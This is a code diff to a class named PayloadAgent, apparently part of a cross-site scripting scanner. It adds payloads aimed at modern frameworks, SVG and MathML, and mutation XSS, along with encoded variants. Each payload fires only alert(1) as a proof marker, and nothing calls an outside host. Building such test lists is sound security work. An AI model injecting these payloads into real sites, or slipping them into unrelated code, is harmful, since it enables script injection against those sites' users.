@@ -54,9 +54,21 @@ class PayloadAgent:
             '<iframe src="javascript:alert(1)">',
             '<object data="javascript:alert(1)">',
             '<embed src="javascript:alert(1)">',
+            
+            # Modern frameworks (React/Vue/Angular)
+            '{{constructor.constructor("alert(1)")()}}',
+            '${alert(1)}',
+            '<div [innerHTML]="\'<script>alert(1)</script>\'">',
+            
+            # SVG/Math variations
+            '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
+            '<svg><script>alert(1)</script>',
+            
+            # Mutation XSS
+            '<noscript><img src=x onerror=alert(1)>',
+            '<template><img src=x onerror=alert(1)>',
         ]
         
-        # Load additional payloads from file if exists
         try:
             with open('payloads/custom_payloads.txt', 'r') as f:
                 for line in f:
@@ -79,7 +91,6 @@ class PayloadAgent:
                 'context': 'auto'
             })
             
-            # Generate encoded variations
             for encoder in self.encoding_techniques:
                 encoded = encoder(base)
                 if encoded != base:
